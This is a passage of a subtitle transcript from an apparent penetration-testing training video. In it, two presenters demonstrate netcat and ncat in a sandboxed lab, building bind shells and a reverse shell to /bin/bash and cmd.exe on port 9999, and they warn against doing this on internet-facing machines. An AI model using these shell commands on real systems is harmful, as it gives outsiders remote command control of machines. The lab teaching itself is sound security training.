00:12:04.530\nThat doesn't mean you're\ngonna see some output,\n\n251\n00:12:04.530 --> 00:12:07.280\nit just means if there is, you'll see it.\n\n252\n00:12:07.280 --> 00:12:10.550\nAnd now what server am\nI trying to connect to?\n\n253\n00:12:10.550 --> 00:12:14.110\nSo if I'm not mistaken, my, well,\nthat'll give us a chance to use our\n\n254\n00:12:15.310 --> 00:12:18.518\nlittle Actually, you know what I'll do?\n\n255\n00:12:18.518 --> 00:12:22.590\nI will ctrl-z this which\nwill pause that process,\n\n256\n00:12:22.590 --> 00:12:23.790\nput it in the background really quickly.\n\n257\n00:12:23.790 --> 00:12:29.910\nI'm gonna get my terminal back,\nand I will do an ifconfig and\n\n258\n00:12:29.910 --> 00:12:33.970\nsee what is my,\nwell that's a good thing I looked.\n\n259\n00:12:33.970 --> 00:12:36.872\nCuz I wouldn't have been able\nto make a connection here.\n\n260\n00:12:36.872 --> 00:12:40.260\nMy interface that I want to\nbe listening on is not up.\n\n261\n00:12:40.260 --> 00:12:41.360\nI've got the wrong interface up.\n\n262\n00:12:41.360 --> 00:12:46.088\nSo what I'm gonna do,\njust to make sure everything is clean and\n\n263\n00:12:46.088 --> 00:12:49.298\nrosy, is I'm going to, I wanna fg this and\n\n264\n00:12:49.298 --> 00:12:54.070\nthen I'm going to ctrl-c it to kill it,\ncontrol c.\n\n265\n00:12:54.070 --> 00:12:54.980\nThere we go.\n\n266\n00:12:54.980 --> 00:12:56.710\nI'm gonna change that really quickly.\n\n267\n00:12:56.710 --> 00:12:59.650\nAnd I'm gonna do it the easy way and\njust go into the graphics.\n\n268\n00:13:01.330 --> 00:13:03.920\nAnd just turn ethernet0 on, hit Connect.\n\n269\n00:13:03.920 --> 00:13:05.600\nGotta love a good graphical tool.\n\n270\n00:13:05.600 --> 00:13:07.440\nThey're there, definitely use them.\n\n271\n00:13:07.440 --> 00:13:10.470\nIf you wanted to do this the hard way,\nyou can just do\n\n272\n00:13:11.910 --> 00:13:16.040\nifconfig eth 0 up, ifconfig eth 1 down.\n\n273\n00:13:17.240 --> 00:13:20.140\nIf up and if down also work typically,\n\n274\n00:13:20.140 --> 00:13:24.270\nI don't think they work on this machine\nfor whatever reason, but there you go.\n\n275\n00:13:24.270 --> 00:13:28.360\nSo now if I do ifconfig, let's see, yeah,\n\n276\n00:13:28.360 --> 00:13:32.570\nyou'll see now my eth1 no\nlonger has an IP address.\n\n277\n00:13:32.570 --> 00:13:35.320\nBut I do have one from eth0 and that's on.\n\n278\n00:13:36.440 --> 00:13:39.780\nThis is a good spot for\nus to give you a fair warning.\n\n279\n00:13:39.780 --> 00:13:43.060\nWhen you're creating vulnerabilities\ninside of machines, you're opening ports,\n\n280\n00:13:43.060 --> 00:13:43.870\nyou're doing things like that,\n\n281\n00:13:43.870 --> 00:13:47.070\nyou're doing testing,\ndon't do it in a live environment.\n\n282\n00:13:47.070 --> 00:13:49.230\nDon't do it on something\nthat accesses the Internet.\n\n283\n00:13:49.230 --> 00:13:50.260\nBecause guess what?\n\n284\n00:13:50.260 --> 00:13:52.996\nThere's guys like you and\nme and girls like you and\n\n285\n00:13:52.996 --> 00:13:57.100\nme that are out there right now actively\nscanning looking for an opening and\n\n286\n00:13:57.100 --> 00:14:00.570\nall they need is x amount of time and\nyou've been compromised.\n\n287\n00:14:00.570 --> 00:14:04.171\nAll you were doing was, I downloaded\nthis and I was playing with it, and\n\n288\n00:14:04.171 --> 00:14:06.410\nnow what's going on with my system?\n\n289\n00:14:06.410 --> 00:14:08.000\nSo build a sand box,\n\n290\n00:14:08.000 --> 00:14:11.070\ndo it inside of a sand boxed\nenvironment with no Internet access.\n\n291\n00:14:11.070 --> 00:14:12.570\n&gt;&gt; That's a great point there, Daniel.\n\n292\n00:14:12.570 --> 00:14:15.640\nIt just takes a second, and\nyou fire up some of these tools and\n\n293\n00:14:15.640 --> 00:14:18.180\nlike anything else they've\ngot some default values.\n\n294\n00:14:18.180 --> 00:14:19.620\nThey're listening on certain ports,\n\n295\n00:14:19.620 --> 00:14:23.360\nand typically we've changed that but\nit does not take long.\n\n296\n00:14:23.360 --> 00:14:26.800\nYou expose it to the Internet, you've got\nsome of those default ports listening.\n\n297\n00:14:26.800 --> 00:14:29.740\nYou're running a Net-cat server,\nsomebody's gonna find it and\n\n298\n00:14:29.740 --> 00:14:33.150\nhave control of your machine\nbefore you can pull the cord.\n\n299\n00:14:33.150 --> 00:14:34.680\nSo be real careful with that.\n\n300\n00:14:34.680 --> 00:14:35.900\n&gt;&gt; Yeah, yeah.\n\n301\n00:14:35.900 --> 00:14:39.180\nAll right, that being said,\nwarning aside now that you know, and\n\n302\n00:14:39.180 --> 00:14:44.245\nknowing is half the battle,\nthe other half is violence, I hear.\n\n303\n00:14:44.245 --> 00:14:45.440\n[LAUGH] So let's move forward.\n\n304\n00:14:45.440 --> 00:14:47.505\nSo now I've got my correct IP address,\n\n305\n00:14:47.505 --> 00:14:50.015\nI will bring up my Net-cat listener yet\nagain.\n\n306\n00:14:50.015 --> 00:14:52.740\nNc-n-\n&gt;&gt; I think you paused it.\n\n307\n00:14:52.740 --> 00:14:53.340\nIs it still running?\n\n308\n00:14:53.340 --> 00:14:54.500\n&gt;&gt; 9999, no, it's good, I killed it.\n\n309\n00:14:54.500 --> 00:14:55.120\n&gt;&gt; Okay.\n&gt;&gt; Yeah.\n\n310\n00:14:55.120 --> 00:14:56.130\n&gt;&gt; Okay.\n&gt;&gt; But thanks for\n\n311\n00:14:56.130 --> 00:14:57.740\nthe heads up, cuz that could've happened.\n\n312\n00:14:57.740 --> 00:15:00.680\nIt would have just spawned another one,\nso not a bit deal.\n\n313\n00:15:00.680 --> 00:15:01.920\nSo, there we go, hit Enter.\n\n314\n00:15:01.920 --> 00:15:05.278\nListing on 9999,\nI am able to go back a little too far.\n\n315\n00:15:05.278 --> 00:15:10.514\nAnd say, 192.168.219.146 was the IP.\n\n316\n00:15:10.514 --> 00:15:14.960\nAnd then, what port was it on,\nit was on 9999.\n\n317\n00:15:14.960 --> 00:15:16.520\nIt's my favorite thing\nin the world to forget.\n\n318\n00:15:16.520 --> 00:15:19.530\nI'll probably do it umpteen\ntimes in this series.\n\n319\n00:15:19.530 --> 00:15:22.400\nAnd it'll yell at me,\nno port specified, idiot!\n\n320\n00:15:22.400 --> 00:15:22.950\nUse a port!\n\n321\n00:15:22.950 --> 00:15:26.580\nThere we go, hit Return and\nnow we have a connection.\n\n322\n00:15:27.775 --> 00:15:30.505\nNot a whole lot going on here.\n\n323\n00:15:30.505 --> 00:15:31.378\nCool thing is, though,\n\n324\n00:15:31.378 --> 00:15:33.714\nI think at this point it's basically\nlike a chat session, right?\n\n325\n00:15:33.714 --> 00:15:34.609\nIf I say hi, there.\n\n326\n00:15:34.609 --> 00:15:37.155\nCan we go back to the Linux box?\n\n327\n00:15:37.155 --> 00:15:39.805\nYou'll notice it says hi, there.\n\n328\n00:15:39.805 --> 00:15:42.205\nRight there.\n\n329\n00:15:42.205 --> 00:15:42.895\n&gt;&gt; Sweet.\n\n330\n00:15:42.895 --> 00:15:45.355\n&gt;&gt; So easy way to build up a little\nchat room for yourself, right?\n\n331\n00:15:45.355 --> 00:15:48.365\nAnybody that wants to connect can connect,\nuse Net-cat to do that.\n\n332\n00:15:48.365 --> 00:15:51.669\nNot really what we're trying to do\nhere even though it's kinda cool.\n\n333\n00:15:51.669 --> 00:15:56.283\nWhat we wanna do is we wanna create\nbind shells and reverse shells.\n\n334\n00:15:56.283 --> 00:15:59.220\nBut we needed to know how to\ncreate a connection first.\n\n335\n00:15:59.220 --> 00:16:01.137\nSo that's what we did,\nthat's why we're here.\n\n336\n00:16:01.137 --> 00:16:03.377\nLet's start there.\n\n337\n00:16:03.377 --> 00:16:05.502\nLet's go with a bind shell.\n\n338\n00:16:05.502 --> 00:16:09.230\nLet's talk about what a bind shell is and\nwhat we mean.\n\n339\n00:16:09.230 --> 00:16:15.080\nSo basically what I'm doing is I'm opening\nthat port and I'm binding my shell.\n\n340\n00:16:15.080 --> 00:16:16.830\nSo if I'm in a Bash environment,\nI'm binding that.\n\n341\n00:16:16.830 --> 00:16:21.591\nIf I'm in a Windows environment,\nI'm binding that cmd.exe,\n\n342\n00:16:21.591 --> 00:16:27.950\nblackbox command prompt to netcat, so that\nwhen I fire up netcat, you get the shell.\n\n343\n00:16:29.230 --> 00:16:30.450\nVery cool right?\n\n344\n00:16:30.450 --> 00:16:31.650\nLet's see how that works.\n\n345\n00:16:32.860 --> 00:16:35.640\nLet's kill this connection because\nwe have to make some changes here.\n\n346\n00:16:35.640 --> 00:16:39.114\nActually I think I can leave this one\nopen but we'll do it from scratch just so\n\n347\n00:16:39.114 --> 00:16:40.870\nyou can see it without encumbrance.\n\n348\n00:16:40.870 --> 00:16:46.843\nLet's see here, just hit control+c\nto kill your netcat connections.\n\n349\n00:16:46.843 --> 00:16:47.913\nVery simple.\n\n350\n00:16:47.913 --> 00:16:52.470\nAnd that's on both Windows and\nLinux environments.\n\n351\n00:16:52.470 --> 00:16:54.320\nSo now that should be killed,\nit's killed over here.\n\n352\n00:16:55.370 --> 00:17:00.338\nSo what I want to do is\nI'll say nc-nlvp and\n\n353\n00:17:00.338 --> 00:17:03.104\nthen my port 9999.\n\n354\n00:17:03.104 --> 00:17:08.710\nAnd I'll say -e/bin/bash,\ncuz I'm in a BASH environment.\n\n355\n00:17:08.710 --> 00:17:10.380\nThat's the shell that I have.\n\n356\n00:17:10.380 --> 00:17:13.070\nIf I have access to other\nshells I can use those as well.\n\n357\n00:17:13.070 --> 00:17:15.290\nI like Bash, I don't know about y'all.\n\n358\n00:17:15.290 --> 00:17:19.100\nGo crazy with whatever you like, but\nI'm typically in a bash environment so\n\n359\n00:17:19.100 --> 00:17:21.160\nthat's where I'm going to bind.\n\n360\n00:17:21.160 --> 00:17:25.130\nI'm binding that to the netcat\nlistener and the port that that's on.\n\n361\n00:17:25.130 --> 00:17:27.360\nThat's why we call it a bind shell.\n\n362\n00:17:27.360 --> 00:17:31.390\nNow anybody that makes a connection\nshould get a bash shell.\n\n363\n00:17:31.390 --> 00:17:33.110\nLet's see if that happens.\n\n364\n00:17:33.110 --> 00:17:35.220\nListening on any ports.\n\n365\n00:17:35.220 --> 00:17:36.930\nOn our client side, no different.\n\n366\n00:17:36.930 --> 00:17:40.018\nWe're just saying,\nmake a connection to this netcat listener.\n\n367\n00:17:42.087 --> 00:17:43.900\nAnd there we go.\n\n368\n00:17:43.900 --> 00:17:45.220\nAnd it's giving me some issues.\n\n369\n00:17:45.220 --> 00:17:45.950\nLet's see here.\n\n370\n00:17:45.950 --> 00:17:46.910\nWhat is my problem?\n\n371\n00:17:47.960 --> 00:17:50.118\nWhat did I do?\n\n372\n00:17:50.118 --> 00:17:56.040\nI did -e, that should be working.\n\n373\n00:17:56.040 --> 00:17:57.260\nWhy is that not happening?\n\n374\n00:17:57.260 --> 00:17:58.630\nI do see that I have a connection.\n\n375\n00:17:59.650 --> 00:18:05.243\nLVP-e, bin bash, yeah, all that's working.\n\n376\n00:18:05.243 --> 00:18:07.924\nSo why did I not get a shell?\n\n377\n00:18:07.924 --> 00:18:09.750\nThat's a very good question my man.\n\n378\n00:18:11.280 --> 00:18:16.285\nYou know what, sometimes, yeah,\nI actually do have a shell.\n\n379\n00:18:16.285 --> 00:18:17.930\n&gt;&gt; [LAUGH].\nThat'll drive you crazy.\n\n380\n00:18:17.930 --> 00:18:19.990\n&gt;&gt; Woah, there for a second.\n\n381\n00:18:19.990 --> 00:18:25.050\nThis is actually a really good\nlearning time right here.\n\n382\n00:18:25.050 --> 00:18:26.910\nPut on your thinking cap.\n\n383\n00:18:26.910 --> 00:18:31.460\nA lot of times, you'll be doing something\nhere in your hacking environment.\n\n384\n00:18:31.460 --> 00:18:32.830\nI'm hacking stuff and\n\n385\n00:18:32.830 --> 00:18:36.260\nwe get exactly what we just saw right\nhere, didn't look like anything happened.\n\n386\n00:18:36.260 --> 00:18:40.020\nIt even fooled me and I know better,\nbecause I was expecting\n\n387\n00:18:40.020 --> 00:18:44.035\nto see- I'm used to working with something\nthat gives me a returned output.\n\n388\n00:18:44.035 --> 00:18:47.790\nThat I forget when you're doing this type\nof environment that you have to have made\n\n389\n00:18:47.790 --> 00:18:50.970\nit do, and I didn't do that,\nI just made a very simple connection.\n\n390\n00:18:54.060 --> 00:18:56.760\nSo don't just assume that it didn't\nwork because you don't see what you\n\n391\n00:18:56.760 --> 00:18:58.220\nexpected to see.\n\n392\n00:18:58.220 --> 00:19:02.640\nMake sure that things\nare moving forward or not.\n\n393\n00:19:02.640 --> 00:19:08.110\nSo if you try to create a reverse\nshell and nothing happens, make sure,\n\n394\n00:19:08.110 --> 00:19:11.260\nhit the enter key a couple times, type\nin a command, see if it does anything,\n\n395\n00:19:11.260 --> 00:19:15.120\nbecause you'll notice that\nthe connection was made, I knew that.\n\n396\n00:19:15.120 --> 00:19:17.310\nFollow your logic, follow your reasoning.\n\n397\n00:19:17.310 --> 00:19:19.750\nThat's where you need to\nbe inside your headspace.\n\n398\n00:19:19.750 --> 00:19:23.920\nWell, I started the listener,\nthat's right.\n\n399\n00:19:23.920 --> 00:19:27.800\nI bound the thing to the port,\nI bound the shell to the port.\n\n400\n00:19:27.800 --> 00:19:28.610\nI create a connection.\n\n401\n00:19:28.610 --> 00:19:31.610\nIt says a connection was made,\nand that was my key.\n\n402\n00:19:31.610 --> 00:19:32.930\nThis is how you need to think.\n\n403\n00:19:34.130 --> 00:19:38.370\nLook for the, the devil is in the details\nwhen it comes to this business.\n\n404\n00:19:38.370 --> 00:19:39.540\nSo look for subtlety.\n\n405\n00:19:39.540 --> 00:19:43.980\nTake your time,\ndon't assume anything and verify.\n\n406\n00:19:43.980 --> 00:19:45.110\nTrust but verify.\n\n407\n00:19:45.110 --> 00:19:49.415\nThese are the guiding stars that\nwill keep you on the right path and\n\n408\n00:19:49.415 --> 00:19:50.745\ngets you inside of the boxes.\n\n409\n00:19:50.745 --> 00:19:55.480\nCuz I can't tell you how many times I\noverlooked a subtle little thing and\n\n410\n00:19:55.480 --> 00:19:58.150\nI had the key to the kingdom right\nin my hand and i overlooked it.\n\n411\n00:19:58.150 --> 00:20:01.330\nI had to go back, why isn't this working?\n\n412\n00:20:01.330 --> 00:20:04.230\nYou will spend days and\nnights in frustrations\n\n413\n00:20:04.230 --> 00:20:08.160\ntrying to figure out what that key is,\nbut stick to it and you will find it.\n\n414\n00:20:08.160 --> 00:20:12.010\nAnd when you do, you will jump for\njoy like nobody's business, it is so\n\n415\n00:20:12.010 --> 00:20:14.590\nmuch fun to get into that stuff.\n\n416\n00:20:14.590 --> 00:20:17.000\nSo that's a good, I did get in there.\n\n417\n00:20:17.000 --> 00:20:18.915\n&gt;&gt; Can you show us what you did there,\nDan?\n\n418\n00:20:18.915 --> 00:20:23.074\nJust scroll back up and just show us the\nprompt, cuz it really didn't look like you\n\n419\n00:20:23.074 --> 00:20:26.050\nhad a shell but I think you\nfired a command and got results.\n\n420\n00:20:26.050 --> 00:20:26.680\n&gt;&gt; Yeah, it did, that's it.\n\n421\n00:20:26.680 --> 00:20:28.310\nI hit the enter key a couple times.\n\n422\n00:20:28.310 --> 00:20:29.170\nI didn't see anything.\n\n423\n00:20:29.170 --> 00:20:33.720\nSometimes that will prompt the prompt to\nshow up like that c:$, whatever it is.\n\n424\n00:20:33.720 --> 00:20:38.800\nOr this was bin bash to give me that\nroot@colley hash sign kind of thing.\n\n425\n00:20:38.800 --> 00:20:41.520\nThat's what I was looking for and\nI didn't see it so it threw me off.\n\n426\n00:20:41.520 --> 00:20:43.360\nBut I actually had made the connection.\n\n427\n00:20:43.360 --> 00:20:46.090\nSo hit enter key a couple times,\nnothing happened.\n\n428\n00:20:46.090 --> 00:20:49.390\nI said well let me try to throw\na command at it and see what it does.\n\n429\n00:20:49.390 --> 00:20:50.720\nThat's again, that's the mindset.\n\n430\n00:20:50.720 --> 00:20:51.650\nSee what these things'll do.\n\n431\n00:20:51.650 --> 00:20:55.330\nNot only what it's designed to do,\nbut what you can make it do.\n\n432\n00:20:55.330 --> 00:20:57.730\nSo I threw ls at it and\nit listed the files.\n\n433\n00:20:57.730 --> 00:21:02.660\nI can do it a little easier with ls-al and\nnow it looks a little more\n\n434\n00:21:03.900 --> 00:21:07.230\nlike, yeah, I'm in a system,\nI'm remotely connected to the Linux.\n\n435\n00:21:07.230 --> 00:21:10.420\nI'm in Windows right now,\nthat is my Linux box.\n\n436\n00:21:10.420 --> 00:21:14.250\nI have control over it,\nI am logged in, that's a bind shell.\n\n437\n00:21:14.250 --> 00:21:16.160\nLet's do it the opposite way, all right?\n\n438\n00:21:16.160 --> 00:21:19.670\nSo let's Ctrl+C, you'll notice that\nthat's killed over here as well.\n\n439\n00:21:19.670 --> 00:21:21.980\nSo if one kills, the other kills.\n\n440\n00:21:21.980 --> 00:21:23.750\nNetcat only likes one connection.\n\n441\n00:21:23.750 --> 00:21:27.414\nWe create a connection,\nit loves that connection until it's dead,\n\n442\n00:21:27.414 --> 00:21:29.760\nonce it's dead, it stops its processes.\n\n443\n00:21:29.760 --> 00:21:34.658\nSo let's do that the opposite way,\nlet's setup\n\n444\n00:21:34.658 --> 00:21:39.922\nthe server here nc.exe-nvlp\nsame type of syntax.\n\n445\n00:21:39.922 --> 00:21:44.857\nLet's see here,\nwe'll put that on port 9999,\n\n446\n00:21:44.857 --> 00:21:51.260\njust like we did before, and\nwe will -e cmd.exe, just like that.\n\n447\n00:21:52.670 --> 00:21:59.650\nReturn, listening,\ngo over to my Linux connection, nc-mv.\n\n448\n00:21:59.650 --> 00:22:01.170\nWhat is its IP address?\n\n449\n00:22:01.170 --> 00:22:04.100\nThat is a good question and\nI can't do the old or\n\n450\n00:22:04.100 --> 00:22:06.520\nhave foreground background\nstuff on Windows.\n\n451\n00:22:06.520 --> 00:22:08.239\nLet's open up another prompt.\n\n452\n00:22:08.239 --> 00:22:11.007\nIt is .168.\n\n453\n00:22:11.007 --> 00:22:12.243\nThere we go.\n\n454\n00:22:12.243 --> 00:22:17.620\nSo 102 168.2190 168, that's funny.\n\n455\n00:22:17.620 --> 00:22:21.585\nAnd on port 9999, ready connection.\n\n456\n00:22:21.585 --> 00:22:25.615\nThis time I did get a user prompt so\nit popped it over for me.\n\n457\n00:22:25.615 --> 00:22:30.125\nHere I know for a fact I have made\na good connection, I am in that system.\n\n458\n00:22:30.125 --> 00:22:37.220\nYou see the prompt changed\nfrom route@kali to c$ users.\n\n459\n00:22:37.220 --> 00:22:41.020\nThat's not on Linux, ladies and\ngentlemen, that's a Windows machine and\n\n460\n00:22:41.020 --> 00:22:45.750\nI can start dir'ing and\ncd.., all of that stuff and\n\n461\n00:22:45.750 --> 00:22:48.780\nI start moving through I now have\na connection to that machine.\n\n462\n00:22:48.780 --> 00:22:52.110\nThis is great for firewalls and\nthings of that nature, or\n\n463\n00:22:52.110 --> 00:22:55.150\nyou need someone to remote in and\ntake a look at something.\n\n464\n00:22:55.150 --> 00:22:57.040\nYou can create a bind shell really easily.\n\n465\n00:22:58.120 --> 00:22:59.040\nI mentioned firewall,\n\n466\n00:22:59.040 --> 00:23:02.870\nsometimes the firewall will be\nblocking those incoming connections.\n\n467\n00:23:03.880 --> 00:23:10.100\nSo the person on the outside will have\nto maybe pump their connection into,\n\n468\n00:23:10.100 --> 00:23:13.180\nor the other way around should I say, cuz\ndepending on what the firewall's doing.\n\n469\n00:23:13.180 --> 00:23:16.580\nFirewall's blocking incoming connections,\nyou need to push it out,\n\n470\n00:23:16.580 --> 00:23:20.590\nif they're blocking outgoing connections,\nyou need to pipe it in.\n\n471\n00:23:20.590 --> 00:23:23.120\nSo just keep that in mind, and\nthat's the difference between the bind and\n\n472\n00:23:23.120 --> 00:23:24.050\nreverse shell.\n\n473\n00:23:24.050 --> 00:23:30.240\nThe bind says I am listening,\nI am bound to this cmd.exe or\n\n474\n00:23:30.240 --> 00:23:33.600\nbin bash, or whatever, and\nany connection comes in gets that.\n\n475\n00:23:33.600 --> 00:23:38.600\nThe other way is send me your connection.\n\n476\n00:23:38.600 --> 00:23:43.340\nI know it's weird, it's tricky, but you've\ngot to get that straight in your head.\n\n477\n00:23:43.340 --> 00:23:45.990\nThat instead of I'm\ngoing to connect to you,\n\n478\n00:23:45.990 --> 00:23:49.790\nit's you're gonna push\nyour connection to me.\n\n479\n00:23:49.790 --> 00:23:51.750\nThe end result is the same.\n\n480\n00:23:51.750 --> 00:23:54.508\nThere's no difference in the way it works,\nwhen it's all said and done.\n\n481\n00:23:54.508 --> 00:23:56.455\nIt's just how it's pushed.\n\n482\n00:23:56.455 --> 00:23:57.688\nSo a reverse shell,\n\n483\n00:23:57.688 --> 00:24:01.752\nsays instead of me connecting to\nyou I'm gonna start a listener and\n\n484\n00:24:01.752 --> 00:24:06.485\nyou're gonna push your connection to me,\nright, that's the difference.\n\n485\n00:24:06.485 --> 00:24:08.204\nSo let's exit out of here.\n\n486\n00:24:08.204 --> 00:24:13.425\nYou'll notice I hit exit, that killed\nthe command prompt over here for that.\n\n487\n00:24:13.425 --> 00:24:15.562\nYou'll notice it stopped here as well.\n\n488\n00:24:15.562 --> 00:24:20.910\nVery cool, cuz that's a legitimate\ncommand prompt command.\n\n489\n00:24:20.910 --> 00:24:24.260\nSo now let's do a reverse shell,\nwhat does that look like?\n\n490\n00:24:24.260 --> 00:24:25.992\nSo creating up a reverse shell,\nlet me see here.\n\n491\n00:24:28.326 --> 00:24:32.337\nI'm doing the same thing\nexcept on the client side is\n\n492\n00:24:32.337 --> 00:24:35.800\nwhere I'm gonna bind that shell, right?\n\n493\n00:24:35.800 --> 00:24:38.020\nBefore we were binding\nthe shell to the listener.\n\n494\n00:24:38.020 --> 00:24:40.840\nNow we're binding the shell to the client.\n\n495\n00:24:40.840 --> 00:24:43.200\nSo that should help you keep\n\n496\n00:24:43.200 --> 00:24:45.730\nthe difference between\nbind versus reverse, okay.\n\n497\n00:24:45.730 --> 00:24:47.343\nReverse shell binds to the client.\n\n498\n00:24:47.343 --> 00:24:50.524\nBind shell binds to the listener,\nall right.\n\n499\n00:24:50.524 --> 00:24:56.329\nSo let's do that,\nlet's create a listener, nc -nlvp 9999.\n\n500\n00:24:56.329 --> 00:24:58.024\nVery simple.\n\n501\n00:24:58.024 --> 00:25:00.843\nListening, I come over\nhere to my clients and\n\n502\n00:25:00.843 --> 00:25:04.490\nI say nc., I think I can leave\nthe .exe off, let's see.\n\n503\n00:25:04.490 --> 00:25:11.928\n/nv2192.168.219.146 on\n\n504\n00:25:11.928 --> 00:25:16.038\nport 9999 and -e for\n\n505\n00:25:16.038 --> 00:25:20.152\nexecute/ or cmd.exe.\n\n506\n00:25:20.152 --> 00:25:22.990\nAnd now look at that.\n\n507\n00:25:22.990 --> 00:25:24.300\nSo we did the reverse, right?\n\n508\n00:25:24.300 --> 00:25:27.700\nWe used the client side to\nsay we'll reverse that shell.\n\n509\n00:25:27.700 --> 00:25:29.470\nThis is known as shell shoveling.\n\n510\n00:25:29.470 --> 00:25:33.130\nI'm shoveling the shell to you,\nright, here it is.\n\n511\n00:25:33.130 --> 00:25:36.570\nInstead of hey, that's a nice shell you\ngot there, let me connect to that, right?\n\n512\n00:25:36.570 --> 00:25:39.387\nSo I know I'm banging this drum but\nit's for a very good reason.\n\n513\n00:25:41.327 --> 00:25:44.060\nLet's see here, so\nthat's bind shells, reverse shells.\n\n514\n00:25:44.060 --> 00:25:50.260\nI do also wanna show you,\nyou saw ncat, which is very cool.\n\n515\n00:25:50.260 --> 00:25:53.230\nBasically works just like netcat.\n\n516\n00:25:53.230 --> 00:26:00.870\nI think it is an update to netcat,\nand it adds some features to that.\n\n517\n00:26:00.870 --> 00:26:04.222\nOne of them being encryption and\nthe other being whitelisting.\n\n518\n00:26:04.222 --> 00:26:07.570\nSo where we were talking about earlier\nwhere if you open up a listener on netcat,\n\n519\n00:26:07.570 --> 00:26:10.110\nanybody that knows that port is open and\nit's sitting there waiting for\n\n520\n00:26:10.110 --> 00:26:12.040\na connection, they can connect to it.\n\n521\n00:26:12.040 --> 00:26:15.030\nAnd it'll say, great, I got a connection.\n\n522\n00:26:15.030 --> 00:26:17.158\nIt doesn't discern what's happening.\n\n523\n00:26:17.158 --> 00:26:20.562\nYou would have to use a firewall or\nsomething to stop connections from\n\n524\n00:26:20.562 --> 00:26:24.330\nhappening, where ncat will allow you\nto do that in its command line itself.\n\n525\n00:26:25.400 --> 00:26:27.160\nSo let's take a look here.\n\n526\n00:26:27.160 --> 00:26:31.300\nWorks very much like\nnetcat in its verbiage.\n\n527\n00:26:31.300 --> 00:26:33.638\nIt's the way we use the syntax,\nshould I say.\n\n528\n00:26:33.638 --> 00:26:35.819\nLet me exit from here.\n\n529\n00:26:35.819 --> 00:26:37.630\nI think that's killed that there, great.\n\n530\n00:26:38.860 --> 00:26:39.670\nSo let's do this.\n\n531\n00:26:39.670 --> 00:26:41.331\nLet's try a bind shell.\n\n532\n00:26:41.331 --> 00:26:46.082\nWe'll say ncat here,\nI think you can still use e,\n\n533\n00:26:46.082 --> 00:26:49.490\nif not it's --exec, like that.\n\n534\n00:26:49.490 --> 00:26:52.250\nI'm gonna try -e just for fun.\n\n535\n00:26:52.250 --> 00:26:56.764\nAnd we'll say, what do I gotta do?\n\n536\n00:26:56.764 --> 00:26:58.168\nI guess set up the listener, right.\n\n537\n00:26:58.168 --> 00:27:02.128\nThis is -bin/bash,\nI'm getting twisted around.\n\n538\n00:27:02.128 --> 00:27:03.890\nI've got so many machines going on.\n\n539\n00:27:03.890 --> 00:27:05.180\nWhere am I at, what am I doing?\n\n540\n00:27:06.260 --> 00:27:10.580\n/bin/bash and we'll say -vln.\n\n541\n00:27:10.580 --> 00:27:12.170\nSame kind of idea, right?\n\n542\n00:27:12.170 --> 00:27:15.080\nVerbosity, listen and no DNS.\n\n543\n00:27:16.420 --> 00:27:20.376\nAnd then you can just tell it\nwhich port to listen to, so 9999.\n\n544\n00:27:20.376 --> 00:27:24.100\nHit Return, and\nnotice that it's listening.\n\n545\n00:27:24.100 --> 00:27:26.875\nCool thing is I can use netcat\nto connect to it, cuz netcat,\n\n546\n00:27:26.875 --> 00:27:28.690\n[LAUGH] it loves connections, right?\n\n547\n00:27:28.690 --> 00:27:32.671\nI can do that.\nOr I can use ncat to connect as well,\n\n548\n00:27:32.671 --> 00:27:36.860\nwhich is just -v and then whatever.\n\n549\n00:27:36.860 --> 00:27:39.470\nAgain, I like verbosity,\nwhatever the machine is.\n\n550\n00:27:40.920 --> 00:27:42.077\nI'm totally messing that up.\n\n551\n00:27:42.077 --> 00:27:47.882\n.168.219.146 on port 9999.\n\n552\n00:27:47.882 --> 00:27:51.306\nThere we go, I'm connected, -al.\n\n553\n00:27:51.306 --> 00:27:53.930\nThere we go, I made a connection,\njust as simple.\n\n554\n00:27:53.930 --> 00:27:54.730\nLet's talk about the cool stuff.\n\n555\n00:27:54.730 --> 00:27:56.720\nLet's do the cool stuff instead.\n\n556\n00:27:56.720 --> 00:27:58.645\nAnybody can make a connection,\nlet's do the neat stuff.\n\n557\n00:27:58.645 --> 00:28:00.548\nSo exit out of this.\n\n558\n00:28:00.548 --> 00:28:04.020\nAnd let's see here.\n\n559\n00:28:04.020 --> 00:28:10.100\nCreate our listener,\nlet's set that up, ncats.\n\n560\n00:28:10.100 --> 00:28:10.900\nLet's see here.\n\n561\n00:28:10.900 --> 00:28:12.679\nIt also does reverse shells,\nas well, so don't forget that.\n\n562\n00:28:12.679 --> 00:28:16.740\nIt does anything netcat can do, but\nwe wanna give you the whitelisting.\n\n563\n00:28:16.740 --> 00:28:17.535\nLet's do that first.\n\n564\n00:28:17.535 --> 00:28:23.260\nLet's say --exec, by the way, that -e\ndid work, so sweet, I will use that.\n\n565\n00:28:23.260 --> 00:28:24.288\nThat's a lot less typing.\n\n566\n00:28:24.288 --> 00:28:31.185\nCmd, all right,\nwe need to do this on, yeah -eos.\n\n567\n00:28:31.185 --> 00:28:33.007\n/bin/bash.\n\n568\n00:28:33.007 --> 00:28:34.110\nI'm so twisted around.\n\n569\n00:28:34.110 --> 00:28:36.630\nI'm trying to keep everything straight for\nyou guys.\n\n570\n00:28:36.630 --> 00:28:38.627\n&gt;&gt; [LAUGH]\n&gt;&gt; And then,\n\n571\n00:28:38.627 --> 00:28:40.280\nthat's why I wrote these down, Mike.\n\n572\n00:28:40.280 --> 00:28:41.908\nI was smart.\n[CROSSTALK]\n\n573\n00:28:41.908 --> 00:28:43.604\n&gt;&gt; Yeah, [LAUGH] it can be extremely,\n\n574\n00:28:43.604 --> 00:28:47.055\nwhat's the word for it, confusing,\nwhen you start playing around,\n\n575\n00:28:47.055 --> 00:28:50.506\nespecially when you're flipping\nfrom one environment to the other,\n\n576\n00:28:50.506 --> 00:28:52.570\ndoing some shells by, and some reverse.\n\n577\n00:28:52.570 --> 00:28:55.240\nI'm like, wait,\nwhich end am I on right now?\n\n578\n00:28:55.240 --> 00:28:57.410\nBut that's why you're taking your time and\n\n579\n00:28:57.410 --> 00:29:01.160\ndocumenting everything you do, extremely\nimportant as you go through this.\n\n580\n00:29:02.250 --> 00:29:04.240\n&gt;&gt; All right,\nI think that should be good to go.\n\n581\n00:29:04.240 --> 00:29:09.067\nSo I'm saying, bind that\n/bin/bash shell to port 9999, and\n\n582\n00:29:09.067 --> 00:29:13.838\nonly allow connections\nfrom 192.168.219.168.\n\n583\n00:29:13.838 --> 00:29:17.130\nThat's whitelisting, basically,\nthese are the only allowed ones.\n\n584\n00:29:17.130 --> 00:29:21.647\nHit Return, of course,\nI must find a host to connect to.\n\n585\n00:29:21.647 --> 00:29:23.783\nMy.\n\n586\n00:29:26.592 